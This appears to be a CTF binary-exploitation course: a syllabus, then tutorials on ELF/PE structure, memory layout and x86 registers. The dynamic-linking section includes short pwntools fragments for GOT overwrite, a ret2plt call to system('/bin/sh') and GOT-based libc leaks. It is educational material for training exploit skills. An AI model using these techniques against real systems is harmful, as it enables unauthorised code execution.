# Syllabus

## Module 1: Fundamentals

- Binary file formats (ELF, PE)
- Executable structure (sections, segments, headers)
- Compilation process and linking
- Assembly language basics (x86, x86-64, ARM)
- CPU architecture and registers
- Memory layout (stack, heap, data, text segments)
- Calling conventions (cdecl, stdcall, fastcall)
- System calls and interrupts

## Module 2: Reconnaissance & Analysis Tools

- File identification utilities (file, strings, binwalk)
- Disassemblers (objdump, radare2, Ghidra, IDA Free)
- Debuggers (GDB, pwndbg, GEF, edb)
- Dynamic analysis tools (strace, ltrace)
- Hex editors
- Binary diffing tools
- Checksec and security property analysis

## Module 3: Reverse Engineering Techniques

- Static analysis workflow
- Dynamic analysis workflow
- Control flow graph analysis
- Decompilation strategies
- Pattern recognition in binaries
- Library function identification
- Anti-debugging detection
- Obfuscation techniques

## Module 4: Memory Corruption Vulnerabilities

- Buffer overflow (stack-based)
- Buffer overflow (heap-based)
- Integer overflow/underflow
- Format string vulnerabilities
- Use-after-free (UAF)
- Double free
- Off-by-one errors
- Uninitialized memory bugs

## Module 5: Stack Exploitation

- Stack frame structure
- Return address overwriting
- Shellcode injection
- NOP sleds
- Stack pivoting
- Return-oriented programming (ROP) basics
- Stack canary bypass techniques
- Frame pointer overwrite

## Module 6: Heap Exploitation

- Heap allocator internals (glibc malloc, ptmalloc2)
- Heap metadata corruption
- Fastbin attacks
- Unsorted bin attacks
- Tcache exploitation
- House of Force
- House of Spirit
- House of Lore
- House of Orange

## Module 7: Protection Mechanisms

- Stack canaries (SSP)
- Non-executable stack (NX/DEP)
- Address Space Layout Randomization (ASLR)
- Position Independent Executables (PIE)
- RELRO (Partial/Full)
- Control Flow Integrity (CFI)
- Seccomp and sandboxing

## Module 8: Bypass Techniques

- Canary leak and bypass
- NX bypass via ROP
- ASLR bypass (information leaks)
- PIE bypass strategies
- ret2libc attacks
- GOT/PLT hijacking
- RELRO bypass techniques
- Format string arbitrary write

## Module 9: Advanced Exploitation

- Return-oriented programming (advanced)
- JOP (Jump-oriented programming)
- SROP (Sigreturn-oriented programming)
- ret2dlresolve
- ret2csu technique
- One-gadget exploitation
- File structure exploitation (_IO_FILE)
- Kernel exploitation basics

## Module 10: Shellcoding

- Shellcode basics and structure
- Syscall invocation
- Null-byte avoidance
- Alphanumeric shellcode
- Polymorphic shellcode
- Staged payloads
- Shellcode encoders
- Architecture-specific shellcode

## Module 11: Exploitation Frameworks & Tools

- pwntools Python library
- Metasploit Framework
- ROPgadget and ropper
- One_gadget
- Libc database tools
- Patchelf and binary patching
- Exploit template generation
- Remote exploitation setup

## Module 12: Debugging Strategies

- Breakpoint management
- Memory examination commands
- Register manipulation
- Pattern generation (cyclic patterns)
- Core dump analysis
- Remote debugging
- Script automation in GDB
- Checkpoint and replay debugging

## Module 13: Information Leak Exploitation

- Format string leaks
- Buffer over-read vulnerabilities
- Pointer disclosure
- Stack/heap address leaks
- Libc base address identification
- Canary leaking
- PIE base calculation
- Building leak primitives

## Module 14: CTF-Specific Techniques

- Flag extraction strategies
- Service interaction automation
- Socket programming for remote exploits
- Exploit reliability improvement
- Race condition exploitation
- Time-based attacks
- Multi-stage exploitation
- Post-exploitation techniques

## Module 15: Practical Methodology

- Vulnerability identification workflow
- Exploit development lifecycle
- Offset calculation techniques
- Payload crafting strategies
- Testing and debugging exploits
- Documentation practices
- Team collaboration in CTFs
- Time management during competitions

## Module 16: Architecture-Specific Topics

- x86/x86-64 specifics
- ARM exploitation differences
- MIPS architecture considerations
- 32-bit vs 64-bit exploitation
- Endianness handling
- Architecture-specific gadgets
- Cross-architecture techniques

## Module 17: Networking & Remote Exploitation

- Socket programming (Python)
- Network protocol analysis
- Remote code execution techniques
- Exploit delivery over network
- Interactive shell handling
- Connection stability
- Timeout and retry logic
- TLS/encrypted channel exploitation

## Module 18: Practice Resources

- CTF platform familiarization (pwnable.kr, pwnable.tw, etc.)
- Challenge categories and difficulty progression
- Writeup analysis techniques
- Building local test environments
- Docker for challenge isolation
- VM setup for binary analysis
- Tool installation and configuration

---

# Binary File Formats (ELF, PE)

## ELF (Executable and Linkable Format)

ELF is the standard binary format for Linux and Unix-like systems. Understanding its structure is fundamental for binary exploitation.

### ELF File Types

**Relocatable Files (*.o)**: Object files produced during compilation, containing code and data suitable for linking with other objects. Not directly executable.

**Executable Files**: Position-dependent or position-independent executables that can be loaded directly into memory for execution.

**Shared Objects (*.so)**: Libraries that can be dynamically linked at runtime, similar to Windows DLLs.

**Core Dumps**: Memory snapshots created when programs crash, used for post-mortem debugging.

### Critical ELF Components

**ELF Header**: Located at the file's beginning, contains metadata about the binary's architecture, entry point, and structure. Key fields include:

- `e_ident`: Magic bytes (0x7f 'E' 'L' 'F') identifying ELF files
- `e_type`: File type (relocatable, executable, shared)
- `e_machine`: Target architecture (x86, x86-64, ARM)
- `e_entry`: Virtual address of the entry point where execution begins
- `e_phoff`: Program header table offset
- `e_shoff`: Section header table offset

**Program Headers (PHDRs)**: Define segments for runtime loading. The loader uses these to map the binary into memory. Critical segment types:

- `PT_LOAD`: Loadable segments containing code or data
- `PT_DYNAMIC`: Dynamic linking information
- `PT_INTERP`: Path to the dynamic linker/loader
- `PT_GNU_STACK`: Stack permission flags (executable stack indicators)
- `PT_GNU_RELRO`: Specifies regions that should be read-only after relocation

**Section Headers**: Define sections for linking and debugging. Not required for execution but critical for analysis:

- `.text`: Executable code
- `.data`: Initialized writable data
- `.rodata`: Read-only data (strings, constants)
- `.bss`: Uninitialized data (zero-initialized at runtime)
- `.plt`: Procedure Linkage Table for dynamic function resolution
- `.got`: Global Offset Table for position-independent addressing
- `.got.plt`: GOT entries specifically for PLT
- `.dynamic`: Dynamic linking information
- `.init` / `.fini`: Initialization and finalization code
- `.init_array` / `.fini_array`: Arrays of function pointers for constructors/destructors

### Analyzing ELF Files in CTF

**readelf**: Primary tool for detailed ELF inspection.

```bash
# Display ELF header
readelf -h binary

# Show program headers (segments)
readelf -l binary

# List all sections
readelf -S binary

# Display symbol tables
readelf -s binary

# Show dynamic section (shared library dependencies)
readelf -d binary

# Display relocations
readelf -r binary

# Show GOT/PLT entries
readelf -R .got.plt binary
```

**file**: Quick identification of binary properties.

```bash
file binary
# Output: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

**objdump**: Disassembly and section analysis.

```bash
# Disassemble all executable sections
objdump -d binary

# Display all headers
objdump -x binary

# Show section contents in hex
objdump -s -j .rodata binary
```

**checksec**: Security property analysis (requires pwntools or checksec.sh).

```bash
checksec --file=binary
# Shows: RELRO, Stack Canary, NX, PIE, RPATH, RUNPATH, Symbols, Fortify
```

### Exploitation-Relevant ELF Features

**Dynamic Linking**: When a binary calls library functions, the actual resolution happens at runtime through the PLT/GOT mechanism. On first call, the PLT stub jumps to the dynamic linker, which resolves the actual function address and updates the GOT entry. Subsequent calls jump directly through the GOT.

This mechanism is exploitable through:

- GOT overwrite attacks (redirect library functions)
- ret2plt techniques (call library functions without knowing their addresses)
- PLT/GOT information leaks

**Relocation Entries**: When the linker cannot determine absolute addresses at link time, it creates relocation entries. The dynamic linker applies these at load time. Types include:

- `R_X86_64_JUMP_SLOT`: PLT relocations
- `R_X86_64_GLOB_DAT`: GOT relocations for global variables
- `R_X86_64_RELATIVE`: Base-relative relocations (PIE)

**Debug Symbols**: Non-stripped binaries contain symbol tables mapping addresses to function/variable names. While helpful for analysis, production binaries typically have symbols stripped. Use `nm` or `readelf -s` to examine symbols.

```bash
# List symbols from binary
nm binary

# Only show dynamic symbols
nm -D binary
```

## PE (Portable Executable)

PE is the executable format for Windows systems (executables, DLLs, drivers, system files).

### PE File Types

**Executables (*.exe)**: Standard application binaries.

**Dynamic Link Libraries (*.dll)**: Shared libraries loaded at runtime.

**Drivers (*.sys)**: Kernel-mode drivers.

**Object Files (*.obj)**: Intermediate compilation output similar to ELF *.o files.

### PE Structure

**DOS Header and Stub**: Legacy MS-DOS compatibility header starting with "MZ" magic bytes (0x4D 0x5A). Contains a pointer (`e_lfanew`) to the actual PE header. The DOS stub prints "This program cannot be run in DOS mode" when executed in DOS.

**PE Header**: Contains the PE signature "PE\0\0" (0x50 0x45 0x00 0x00) followed by the COFF File Header.

**COFF File Header**: Architecture and file characteristics:

- `Machine`: Target CPU (0x014c = x86, 0x8664 = x86-64)
- `NumberOfSections`: Section count
- `TimeDateStamp`: Compilation timestamp
- `Characteristics`: File properties (executable, DLL, stripped symbols)

**Optional Header**: Despite its name, required for executables. Contains critical runtime information:

- `Magic`: 0x010B (PE32) or 0x020B (PE32+/64-bit)
- `AddressOfEntryPoint`: RVA (Relative Virtual Address) where execution begins
- `ImageBase`: Preferred load address in memory
- `SectionAlignment`: Section alignment in memory
- `FileAlignment`: Section alignment on disk
- `Subsystem`: GUI vs Console application
- `DllCharacteristics`: Security features (ASLR, DEP, CFG)

**Data Directories**: Array of 16 entries pointing to special structures:

- Export Table: Exported functions (for DLLs)
- Import Table: Required DLLs and imported functions
- Resource Table: Icons, dialogs, strings
- Exception Table: Structured exception handling data
- Relocation Table: Base relocation information
- Debug Directory: Debug information path
- TLS Table: Thread Local Storage initialization
- IAT (Import Address Table): Runtime-resolved import addresses

**Section Headers**: Define sections similar to ELF:

- `.text`: Executable code
- `.data`: Initialized writable data
- `.rdata`: Read-only data
- `.bss`: Uninitialized data
- `.idata`: Import information
- `.edata`: Export information
- `.reloc`: Base relocations for ASLR
- `.rsrc`: Resources

Each section header contains:

- `VirtualAddress`: RVA in memory
- `SizeOfRawData`: Size on disk
- `PointerToRawData`: File offset
- `Characteristics`: Permissions (read/write/execute)

### Analyzing PE Files in CTF

**pefile** (Python library): Programmatic PE parsing.

```python
import pefile

pe = pefile.PE('binary.exe')

# Display basic info
print(f"Entry Point: {hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)}")
print(f"Image Base: {hex(pe.OPTIONAL_HEADER.ImageBase)}")

# List sections
for section in pe.sections:
    print(f"{section.Name.decode().rstrip('\x00')}: {hex(section.VirtualAddress)}")

# Show imports
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"DLL: {entry.dll.decode()}")
    for imp in entry.imports:
        print(f"  {imp.name.decode() if imp.name else 'Ordinal ' + str(imp.ordinal)}")
```

**PE-bear**: GUI tool for interactive PE analysis. Provides hex editor, section viewer, imports/exports browser.

**CFF Explorer**: Advanced PE editor allowing direct modification of headers, sections, and resources.

**dumpbin** (Windows SDK): Command-line PE analysis tool.

```cmd
REM Display headers
dumpbin /headers binary.exe

REM Show imports
dumpbin /imports binary.exe

REM Display exports (for DLLs)
dumpbin /exports library.dll

REM Disassemble
dumpbin /disasm binary.exe
```

**objdump** (MinGW/Cygwin): Cross-platform alternative.

```bash
# Analyze PE on Linux
objdump -x binary.exe

# Disassemble
objdump -d binary.exe
```

**radare2**: Cross-platform binary analysis framework supporting PE.

```bash
r2 binary.exe
# Inside r2:
# iI - Binary info
# iS - Sections
# ii - Imports
# iE - Exports
# izz - Strings
```

### Exploitation-Relevant PE Features

**Import Address Table (IAT)**: Similar to ELF's GOT, the IAT contains addresses of imported functions resolved by the Windows loader. Exploitable through:

- IAT overwrite (redirect library calls)
- IAT information leaks

**Relocation Table**: PE files compiled without `/DYNAMICBASE` have a fixed `ImageBase`. With ASLR enabled (`/DYNAMICBASE`), the loader uses the relocation table to adjust all absolute addresses. Lack of relocations indicates no ASLR support.

**Structured Exception Handling (SEH)**: Windows exception handling mechanism using exception handler chains. Historical exploitation vector (SEH overwrites) largely mitigated by SafeSEH, SEHOP.

**Thread Local Storage (TLS) Callbacks**: Functions executed before the entry point, sometimes used for anti-debugging or initialization. Can be exploited if vulnerable.

### Cross-Format Comparison

|Feature|ELF|PE|
|---|---|---|
|Magic Bytes|0x7f 'ELF'|'MZ' ... 'PE\0\0'|
|Primary OS|Linux/Unix|Windows|
|Sections vs Segments|Both (sections for linking, segments for loading)|Sections only|
|Dynamic Linking|PLT/GOT|IAT|
|Position Independence|PIE (ET_DYN)|/DYNAMICBASE|
|Relocation Info|.rel/.rela sections|.reloc section|

## Practical CTF Applications

**Binary Fingerprinting**: Use file format analysis to identify:

- Architecture (x86, x64, ARM)
- Operating system
- Compilation toolchain
- Security mitigations present

**Entry Point Analysis**: Both formats specify where execution begins. This is your starting point for reverse engineering and often where vulnerabilities manifest in simple CTF challenges.

**Import/Export Analysis**: Understanding which functions a binary uses reveals:

- Attack surface (dangerous functions like `system`, `strcpy`)
- Available gadgets for ROP (return-oriented programming)
- Potential information leak vectors

**Security Mitigation Identification**: Use `checksec` (ELF) or examine PE headers to determine:

- Stack canaries (Stack Smashing Protection)
- NX/DEP (Non-executable stack)
- PIE/ASLR (Address randomization)
- RELRO (GOT protection)
- Control Flow Guard (Windows CFG)

This information dictates which exploitation techniques are viable.

---

# Executable Structure (Sections, Segments, Headers)

## Memory Layout and Address Spaces

Understanding how executables are mapped from disk to memory is critical for exploitation. The layout differs between 32-bit and 64-bit systems.

### Typical Linux Process Memory Layout (32-bit)

```
0xFFFFFFFF  ┌─────────────────┐
            │  Kernel Space   │ (Not accessible from user mode)
0xC0000000  ├─────────────────┤
            │     Stack       │ (Grows downward)
            │       ↓         │
            ├─────────────────┤
            │  Memory Mapped  │ (Shared libraries, mmap regions)
            │     Region      │
            ├─────────────────┤
            │       ↑         │
            │      Heap       │ (Grows upward)
            ├─────────────────┤
            │      .bss       │ (Uninitialized data)
            ├─────────────────┤
            │      .data      │ (Initialized data)
            ├─────────────────┤
            │     .rodata     │ (Read-only data)
            ├─────────────────┤
            │      .text      │ (Executable code)
0x08048000  ├─────────────────┤ (Typical base for non-PIE)
            │    Reserved     │
0x00000000  └─────────────────┘
```

### Typical Linux Process Memory Layout (64-bit)

```
0xFFFFFFFFFFFFFFFF  ┌─────────────────┐
                    │  Kernel Space   │
0xFFFF800000000000  ├─────────────────┤ (Canonical address hole)
0x00007FFFFFFFFFFF  ├─────────────────┤
                    │     Stack       │
                    │       ↓         │
                    ├─────────────────┤
                    │  Memory Mapped  │ (Libraries typically load here)
                    │     Region      │
                    ├─────────────────┤
                    │       ↑         │
                    │      Heap       │
                    ├─────────────────┤
                    │  .bss/.data     │
                    ├─────────────────┤
                    │  .text/.rodata  │
0x0000555555554000  ├─────────────────┤ (Typical PIE base)
0x0000000000400000  ├─────────────────┤ (Non-PIE base)
                    │    Reserved     │
0x0000000000000000  └─────────────────┘
```

**[Inference]**: The exact addresses vary based on ASLR configuration and kernel version. These layouts represent common defaults but are not guaranteed.

### Windows Process Memory Layout

Windows uses a different memory organization with varying layouts between versions and architectures.

**32-bit Windows (typical)**:

- `0x00000000 - 0x0000FFFF`: Null pointer protection (reserved)
- `0x00010000 - 0x7FFEFFFF`: User-mode address space
- `0x7FFF0000 - 0x7FFFFFFF`: User-mode shared data
- `0x80000000 - 0xFFFFFFFF`: Kernel-mode address space

**64-bit Windows**:

- User space: `0x00000000'00000000 - 0x000007FF'FFFFFFFF`
- Kernel space: `0xFFFF0800'00000000 - 0xFFFFFFFF'FFFFFFFF`

## Sections Deep Dive

### Code Sections (.text)

The `.text` section contains the actual machine code instructions executed by the processor.

**Properties**:

- Permissions: Read + Execute (typically not writable)
- Content: Compiled function code, including main, library function wrappers
- Alignment: Usually page-aligned (4KB on x86/x64)

**CTF Relevance**:

- Primary target for disassembly and reverse engineering
- Contains gadgets for ROP chains
- Entry point always resides in or is reached through `.text`
- Non-writable nature prevents simple code injection

**Analysis Commands**:

```bash
# Disassemble .text section
objdump -d -j .text binary

# Extract .text section bytes
objdump -s -j .text binary

# In radare2
r2 binary
[0x00000000]> iS~text  # Find .text section info
[0x00000000]> s section..text  # Seek to .text
[0x00000000]> pdf @ main  # Disassemble main function
```

### Data Sections (.data, .rodata, .bss)

**.data**: Initialized global and static variables with read-write permissions.

```c
int global_var = 42;  // Stored in .data
static char buffer[100] = {1, 2, 3};  // Stored in .data
```

**Properties**:

- Permissions: Read + Write
- Contains: Non-zero initialized variables
- Fixed size determined at compile time

**.rodata**: Read-only data including string literals and const variables.

```c
const char *message = "Hello";  // "Hello" stored in .rodata
printf("Format string");  // "Format string" in .rodata
```

**Properties**:

- Permissions: Read-only
- Contains: String literals, const data, jump tables
- Cannot be modified at runtime (segmentation fault if attempted)

**.bss** (Block Started by Symbol): Uninitialized or zero-initialized data.

```c
int uninitialized;  // Stored in .bss
static char buffer[1000];  // Stored in .bss (zero-initialized)
```

**Properties**:

- Permissions: Read + Write
- Occupies no space on disk (file size optimization)
- Initialized to zero by loader at runtime
- Size defined in section header

**CTF Exploitation Vectors**:

- Writable sections (.data, .bss) can store shellcode if NX is disabled
- Used as targets for arbitrary write primitives
- .rodata contains format strings that might be vulnerable
- String pointers in .rodata can be leaked to defeat ASLR

**Finding Writable Memory**:

```bash
# List sections with permissions
readelf -S binary | grep -E 'WRITE|ALLOC'

# In GDB with pwndbg
pwndbg> vmmap
# Shows all memory regions with permissions

# Find writable addresses
objdump -h binary | grep -E '\.data|\.bss'
```

### Dynamic Linking Sections (.plt, .got, .got.plt)

These sections implement the lazy binding mechanism for shared library functions.

**.plt (Procedure Linkage Table)**: Contains stub code for each external function.

**Structure of PLT entry**:

```assembly
; First call to function@plt
function@plt:
    jmp    *function@got.plt      ; Jump to address in GOT
    push   $reloc_offset          ; Push relocation index
    jmp    PLT[0]                 ; Jump to resolver
```

**PLT[0]** (resolver stub):

```assembly
PLT[0]:
    push   *GOT[1]                ; Link map object
    jmp    *GOT[2]                ; Jump to dynamic linker
```

**.got.plt (Global Offset Table for PLT)**: Contains function addresses, initially pointing back into PLT.

**Before first call**: `function@got.plt` contains address of `push` instruction in PLT **After first call**: `function@got.plt` contains actual resolved function address in libc

**.got (Global Offset Table)**: Contains addresses of global variables from shared libraries.

**Lazy Binding Process**:

1. Program calls `printf@plt`
2. PLT entry jumps to address stored in `printf@got.plt`
3. First time: GOT contains address of next PLT instruction
4. PLT pushes relocation info and jumps to dynamic linker
5. Dynamic linker resolves actual `printf` address in libc
6. Linker updates `printf@got.plt` with resolved address
7. Control transfers to actual `printf` in libc
8. Subsequent calls jump directly through GOT to `printf`

**CTF Exploitation**:

**GOT Overwrite**: If you can write to `.got.plt`, redirect library functions to attacker-controlled code.

```python
# Example: Overwrite puts@got.plt with system address
from pwn import *

elf = ELF('./binary')
# Find GOT entry
puts_got = elf.got['puts']
# Overwrite with system address (requires leak)
payload = p64(system_addr)
```

**ret2plt**: Call PLT entries to execute library functions without knowing their addresses.

```python
# Call system@plt (requires "/bin/sh" string somewhere)
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/sh')))
```

**Information Leaks**: Read GOT entries to leak libc addresses and defeat ASLR.

```python
# Leak libc address from GOT
puts_got = elf.got['puts']
# Use format string or read primitive to leak puts_got content
# Calculate libc base: libc_base = leaked_puts - libc.symbols['puts']
```

**Viewing PLT/GOT**:

```bash
# List PLT entries
objdump -d -j .plt binary

# Display GOT contents
readelf -r binary

# In GDB
gdb binary
gdb> info functions @plt  # List PLT stubs
gdb> x/10gx &_GLOBAL_OFFSET_TABLE_  # Examine GOT

# In pwndbg
pwndbg> got  # Display GOT with resolved/unresolved status
```

### Initialization and Finalization Sections

**.init / .init_array**: Code executed before `main()`.

**.fini / .fini_array**: Code executed after `main()` returns or during `exit()`.

**Constructor/Destructor Attributes** (GCC):

```c
__attribute__((constructor))
void before_main() {
    // Executed before main
}

__attribute__((destructor))
void after_main() {
    // Executed after main or during exit
}
```

These functions' addresses are stored in `.init_array` and `.fini_array`.

**CTF Relevance**:

- Sometimes contain anti-debugging or setup code
- Can be hijacked if writable (rare with RELRO)
- Useful for understanding execution flow before main

```bash
# View init/fini functions
readelf -d binary | grep -E 'INIT|FINI'

# Disassemble .init
objdump -d -j .init binary
```

### Exception Handling Sections

**.eh_frame / .eh_frame_hdr**: Exception handling metadata for C++ and stack unwinding.

Contains frame description entries (FDEs) describing how to unwind the stack at any program counter address.

**CTF Relevance**:

- Can be parsed to find gadgets for ROP
- Sometimes writable in older binaries, allowing hijacking
- Contains function boundary information useful for analysis

```bash
# Parse exception handling info
readelf --debug-dump=frames binary

# In radare2, search .eh_frame for gadgets
r2 binary
[0x00000000]> /R pop rdi  # Search for ROP gadgets
```

## Segments (Program Headers)

Segments define how the binary should be loaded into memory. Each segment may contain multiple sections.

### Common Segment Types

**PT_LOAD**: Loadable segments mapped into memory.

Typically, ELF binaries have at least two PT_LOAD segments:

- First PT_LOAD: Read+Execute (contains .text, .rodata, .plt)
- Second PT_LOAD: Read+Write (contains .data, .bss, .got)

```bash
# View segments
readelf -l binary

# Output shows:
# Type    Offset   VirtAddr   PhysAddr   FileSiz  MemSiz   Flg Align
# LOAD    0x000000 0x00400000 0x00400000 0x001234 0x001234 R E 0x1000
# LOAD    0x001234 0x00601234 0x00601234 0x000400 0x000600 RW  0x1000
```

**PT_DYNAMIC**: Points to the `.dynamic` section containing dynamic linking information.

Contains tags like:

- `DT_NEEDED`: Required shared libraries
- `DT_SYMTAB`: Symbol table address
- `DT_STRTAB`: String table address
- `DT_PLTGOT`: GOT address

```bash
# Display dynamic section
readelf -d binary
```

**PT_INTERP**: Specifies the dynamic linker path.

```bash
# View dynamic linker
readelf -l binary | grep interpreter
# Output: [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
```

**PT_GNU_STACK**: Defines stack permissions.

- Flags: `RW` = Non-executable stack (NX enabled)
- Flags: `RWE` = Executable stack (NX disabled, potential shellcode injection)

```bash
# Check stack permissions
readelf -l binary | grep GNU_STACK
# GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

**PT_GNU_RELRO**: Specifies regions to be made read-only after relocation.

**No RELRO**: `.got.plt` remains writable throughout execution **Partial RELRO**: `.got` is read-only, but `.got.plt` remains writable (lazy binding still works) **Full RELRO**: Entire GOT is read-only, lazy binding disabled (bind now)

```bash
# Check RELRO status
readelf -l binary | grep GNU_RELRO
checksec --file=binary
```

### Virtual Memory to File Offset Translation

**Virtual Address (VA)**: Address as seen by the running process **File Offset**: Position in the binary file on disk

Translation formula for addresses within PT_LOAD segments:

```
FileOffset = VirtualAddress - SegmentVirtualAddress + SegmentFileOffset
```

**Example**:

```bash
# Find segment containing address 0x400500
readelf -l binary
# LOAD: VirtAddr=0x400000, FileOffset=0x0000

# Address 0x400500 is at file offset:
# 0x400500 - 0x400000 + 0x0 = 0x500
```

**Practical use in CTF**:

```bash
# Extract bytes at virtual address 0x400500
objdump -s --start-address=0x400500 --stop-address=0x400510 binary

# Or use dd with calculated offset
dd if=binary bs=1 skip=$((0x500)) count=16 | xxd
```

## Headers in Detail

### ELF Header Fields

```bash
readelf -h binary
```

**Critical fields**:

- `Type`: `EXEC` (non-PIE) vs `DYN` (PIE or shared library)
- `Entry point address`: First instruction executed (usually `_start`)
- `Start of program headers`: Offset to PHDR table
- `Start of section headers`: Offset to section header table
- `Flags`: Architecture-specific flags
- `Size of this header`: 64 bytes (64-bit) or 52 bytes (32-bit)
- `Number of program headers`: PHDR count
- `Number of section headers`: Section count

**PIE Detection**:

```bash
readelf -h binary | grep Type
# Type: EXEC = not PIE
# Type: DYN = PIE or shared library
```

### PE Headers

**DOS Header** (IMAGE_DOS_HEADER):

- `e_magic`: 'MZ' (0x5A4D)
- `e_lfanew`: Offset to PE header

**PE Signature**: 'PE\0\0' (0x50450000)

**COFF Header** (IMAGE_FILE_HEADER):

- `Machine`: Architecture identifier
- `NumberOfSections`: Section count
- `Characteristics`: Properties (executable, DLL, large address aware)

**Optional Header** (IMAGE_OPTIONAL_HEADER):

- `Magic`: PE32 (0x10B) or PE32+ (0x20B)
- `AddressOfEntryPoint`: RVA of entry point
- `ImageBase`: Preferred load address
- `SectionAlignment`: Memory alignment (usually 0x1000 = 4KB)
- `FileAlignment`: Disk alignment (usually 0x200 = 512 bytes)
- `DllCharacteristics`: Security features

**DllCharacteristics flags** (security features):

- `0x0040`: `DYNAMIC_BASE` (ASLR enabled)
- `0x0100`: `NX_COMPAT` (DEP enabled)
- `0x0400`: `NO_SEH` (no SEH handlers)
- `0x4000`: `GUARD_CF` (Control Flow Guard enabled)

```python
# Check PE security features with pefile
import pefile

pe = pefile.PE('binary.exe')
dll_chars = pe.OPTIONAL_HEADER.DllCharacteristics

aslr = bool(dll_chars & 0x0040)
dep = bool(dll_chars & 0x0100)
cfg = bool(dll_chars & 0x4000)

print(f"ASLR: {aslr}, DEP: {dep}, CFG: {cfg}")
```

## Section vs Segment Relationship

Multiple sections are grouped into segments for loading:

```
Segment 1 (PT_LOAD, R-X):
├── .init
├── .plt
├── .text
└── .rodata

Segment 2 (PT_LOAD, RW-):
├── .data
├── .bss
├── .got
└── .got.plt
```

**Why both?**

- **Sections**: Granular organization for linking and debugging
- **Segments**: Coarse-grained organization for memory mapping and permissions

**Loader behavior**: Processes program headers (segments), ignoring section headers. Sections are primarily for development tools.

```bash
# Strip section headers (binary still runs)
strip --strip-all binary

# Verify: section headers gone, program headers remain
readelf -S binary  # May show nothing or minimal sections
readelf -l binary  # Segments still present
```

## Practical CTF Workflow

### Initial Binary Analysis Checklist

```bash
# 1. Identify file type and architecture
file binary
checksec --file=binary

# 2. Find entry point and security features
readelf -h binary
readelf -l binary | grep -E 'GNU_STACK|GNU_RELRO'

# 3. Examine sections
readelf -S binary

# 4. Check dynamic dependencies
ldd binary
readelf -d binary

# 5. List imported/exported functions
nm -D binary
readelf -s binary

# 6. Find interesting strings
strings binary
rabin2 -z binary  # With radare2

# 7. Identify writable sections for exploitation
readelf -S binary | grep WA
```

This comprehensive understanding of executable structure enables you to identify attack surfaces, determine viable exploitation techniques, and craft working exploits during CTF challenges.

---

# CPU Architecture and Registers

## x86/x86-64 Architecture Overview

### General Purpose Registers

**32-bit (x86) Registers:**

- **EAX** (Accumulator): Arithmetic operations, function return values
- **EBX** (Base): Base pointer for memory access
- **ECX** (Counter): Loop counters, shift/rotate operations
- **EDX** (Data): I/O operations, arithmetic extensions (high bits of multiplication)
- **ESI** (Source Index): String/memory operations source
- **EDI** (Destination Index): String/memory operations destination
- **EBP** (Base Pointer): Stack frame base pointer
- **ESP** (Stack Pointer): Current stack top pointer

**64-bit (x86-64) Registers:**

- **RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP**: 64-bit extensions of 32-bit registers
- **R8-R15**: Additional 64-bit general purpose registers
- Lower portions accessible as: R8D (32-bit), R8W (16-bit), R8B (8-bit)

**Register Subset Access:**

```
RAX (64-bit)
├── EAX (lower 32 bits)
    ├── AX (lower 16 bits)
        ├── AH (high 8 bits of AX)
        └── AL (low 8 bits of AX)
```

### Special Purpose Registers

**Instruction Pointer:**

- **EIP** (32-bit) / **RIP** (64-bit): Points to next instruction to execute
- Cannot be directly modified (modified via jumps, calls, returns)
- Critical target for control flow hijacking

**EFLAGS/RFLAGS Register** (status and control bits):

- **ZF** (Zero Flag): Set when arithmetic result is zero
- **SF** (Sign Flag): Set when result is negative
- **CF** (Carry Flag): Set when unsigned arithmetic overflows
- **OF** (Overflow Flag): Set when signed arithmetic overflows
- **DF** (Direction Flag): Controls string operation direction
- **IF** (Interrupt Flag): Enables/disables interrupts

### Segment Registers

- **CS** (Code Segment): Code execution segment
- **DS** (Data Segment): Data access segment
- **SS** (Stack Segment): Stack operations segment
- **ES, FS, GS**: Additional segment registers (FS/GS used for thread-local storage)

### Examining Registers in GDB

```bash
# Start debugging
gdb ./binary

# View all registers
info registers
# or
i r

# View specific register
i r rax
i r rip

# View registers in different formats
i r rax  # Hexadecimal (default)
p/d $rax # Decimal
p/t $rax # Binary
p/x $rax # Hexadecimal

# View 64-bit and partial register values
i r rax eax ax al ah
```

### Register Inspection with pwndbg/GEF

```bash
# pwndbg enhanced register view
registers

# Watch register changes
context  # Shows register state at each step

# GEF register display
registers
```

## Memory Layout

### Virtual Memory Organization (Low to High Addresses)

```
High Memory (0xFFFFFFFFFFFFFFFF on 64-bit)
┌─────────────────────┐
│   Kernel Space      │ (Typically 0xFFFF800000000000+)
├─────────────────────┤
│   Stack             │ (Grows downward ↓)
│   (Local vars,      │
│    return addrs)    │
├─────────────────────┤
│        ↓            │
│   (Unused space)    │
│        ↑            │
├─────────────────────┤
│   Memory Mapping    │ (Shared libraries, mmap regions)
│   (Libraries)       │
├─────────────────────┤
│        ↓            │
│   (Unused space)    │
│        ↑            │
├─────────────────────┤
│   Heap              │ (Grows upward ↑)
│   (Dynamic alloc)   │
├─────────────────────┤
│   BSS               │ (Uninitialized global/static)
├─────────────────────┤
│   Data              │ (Initialized global/static)
├─────────────────────┤
│   Text/Code         │ (Program instructions - read-only)
└─────────────────────┘
Low Memory (0x00000000)
```

### Text Segment (Code Segment)

**Characteristics:**

- Contains executable machine code
- Read-only and executable (R-X permissions)
- Shared among processes running same binary
- Fixed size at compile time

**Inspection:**

```bash
# View memory mappings
cat /proc/$PID/maps
# or in GDB
info proc mappings

# Examine text segment
readelf -S ./binary | grep .text
objdump -d ./binary | head -n 50

# GDB text inspection
disassemble main
x/20i main  # Examine 20 instructions at main
```

### Data Segment

**Initialized Data (.data):**

- Global and static variables with initial values
- Read-write permissions (RW-)
- Example: `int global_var = 42;`

**Uninitialized Data (.bss):**

- Global and static variables without explicit initialization
- Zero-initialized at program start
- Does not occupy space in binary file
- Example: `int global_array[1000];`

```bash
# View data sections
readelf -S ./binary | grep -E '\.data|\.bss'
objdump -s -j .data ./binary
objdump -s -j .bss ./binary

# In GDB, examine data addresses
info variables  # List all global variables
x/10wx 0x601040  # Examine 10 words at data address
```

### Heap Segment

**Allocation Methods:**

- `malloc()`, `calloc()`, `realloc()` in C
- `new` operator in C++
- System calls: `brk()`, `sbrk()`, `mmap()`

**Characteristics:**

- Grows upward (toward higher addresses)
- Dynamically sized during runtime
- Read-write permissions (RW-)
